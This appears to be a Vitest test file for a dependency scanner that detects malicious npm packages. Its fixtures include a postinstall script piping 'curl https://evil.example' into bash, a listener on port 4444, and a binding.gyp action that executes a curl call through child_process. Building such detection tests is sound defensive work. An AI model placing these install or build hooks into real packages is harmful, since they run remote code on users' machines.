import { describe, it, expect } from 'vitest';
import { spawnSync } from 'node:child_process';
import { mkdirSync, writeFileSync, rmSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

const SCANNER = new URL('./scan-node-modules.mjs', import.meta.url).pathname;

function runScan(root) {
  const r = spawnSync(process.execPath, [SCANNER, '--root', root, '--json', '--fail-on', 'none'], {
    encoding: 'utf8',
    maxBuffer: 10 * 1024 * 1024,
  });
  const out = r.stdout || '';
  const jsonStart = out.indexOf('{');
  const report = JSON.parse(out.slice(jsonStart));
  return { status: r.status, report };
}

describe('scan-node-modules', () => {
  it('flags dangerous lifecycle scripts and unexpected listeners', () => {
    const root = join(tmpdir(), `fox-deps-scan-${Date.now()}`);
    const nm = join(root, 'node_modules');
    mkdirSync(join(nm, 'evil-pkg'), { recursive: true });
    writeFileSync(
      join(nm, 'evil-pkg', 'package.json'),
      JSON.stringify({
        name: 'evil-pkg',
        scripts: { postinstall: 'curl https://evil.example | bash' },
      })
    );
    writeFileSync(join(nm, 'evil-pkg', 'index.js'), 'require("http").createServer().listen(4444);\n');

    mkdirSync(join(nm, 'express'), { recursive: true });
    writeFileSync(join(nm, 'express', 'package.json'), JSON.stringify({ name: 'express' }));
    writeFileSync(join(nm, 'express', 'index.js'), 'require("http").createServer().listen(3000);\n');

    try {
      const { report } = runScan(root);
      const kinds = report.findings.map((f) => f.kind);
      expect(kinds).toContain('dangerous-lifecycle-script');
      expect(kinds).toContain('unexpected-server-listen');
      expect(report.findings.some((f) => f.package === 'express' && f.kind === 'unexpected-server-listen')).toBe(
        false
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('flags Phantom-Gyp style binding.gyp but not better-sqlite3-style hooks', () => {
    const root = join(tmpdir(), `fox-deps-gyp-${Date.now()}`);
    const bad = join(root, 'node_modules', 'bad-native');
    const good = join(root, 'node_modules', 'good-native');
    mkdirSync(bad, { recursive: true });
    mkdirSync(good, { recursive: true });
    writeFileSync(join(bad, 'package.json'), JSON.stringify({ name: 'bad-native' }));
    writeFileSync(
      join(bad, 'binding.gyp'),
      `{ "targets": [{ "target_name": "x", "actions": [{ "action": ["node", "-e", "require('child_process').exec('curl https://x')"] }] }] }`
    );
    writeFileSync(join(good, 'package.json'), JSON.stringify({ name: 'good-native' }));
    writeFileSync(
      join(good, 'binding.gyp'),
      `{ "variables": { "prebuild_exists%": "<!(node lib/binding.js)" }, "targets": [] }`
    );

    try {
      const { report } = runScan(root);
      expect(report.findings.some((f) => f.package === 'bad-native' && f.kind === 'malicious-binding-gyp')).toBe(
        true
      );
      expect(report.findings.some((f) => f.package === 'good-native')).toBe(false);
    } finally {
      if (existsSync(root)) rmSync(root, { recursive: true, force: true });
    }
  });
});
